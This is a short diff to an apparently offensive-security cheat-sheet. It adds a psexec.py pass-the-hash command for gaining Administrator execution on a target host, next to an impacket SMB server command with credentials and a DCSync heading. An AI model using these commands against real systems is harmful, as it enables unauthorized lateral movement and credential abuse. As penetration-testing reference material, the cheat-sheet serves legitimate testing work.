@@ -18,6 +18,12 @@
 sudo ./smbserver.py Test /tmp -smb2support -user polo -password test123 
 ```
 
+## Psexec
+
+```csharp
+./psexec.py -hashes <ntlm hash:ntlm hash> Administrator@<IP TARGET>
+```
+
 ## DSYNC
 
 ```csharp
